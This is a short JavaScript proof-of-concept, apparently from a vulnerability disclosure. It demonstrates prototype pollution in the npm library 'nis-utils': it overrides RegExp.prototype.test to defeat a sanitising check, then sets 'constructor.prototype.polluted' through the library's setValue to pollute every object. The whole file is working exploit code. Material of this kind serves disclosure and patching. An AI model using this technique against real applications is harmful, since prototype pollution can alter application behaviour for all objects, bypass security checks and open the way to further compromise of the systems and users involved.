RegExp.prototype.test = () => false;
const nisUtils = require('nis-utils');
const object1 = {};
console.log({}.polluted);
nisUtils.object.setValue({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);